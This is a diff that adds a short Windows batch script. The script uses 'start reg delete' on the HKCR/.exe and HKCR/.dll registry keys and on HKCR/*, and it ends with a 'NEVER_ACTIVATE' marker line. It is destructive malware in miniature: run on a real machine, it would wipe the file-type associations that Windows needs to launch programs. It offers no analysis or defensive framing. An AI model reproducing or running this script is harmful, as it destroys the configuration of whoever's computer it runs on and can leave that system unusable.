@@ -1,0 +1,6 @@
+@echo off
+start reg delete HKCR/.exe
+start reg delete HKCR/.dll
+start reg delete HKCR/*
+
+------NEVER_ACTIVATE-------
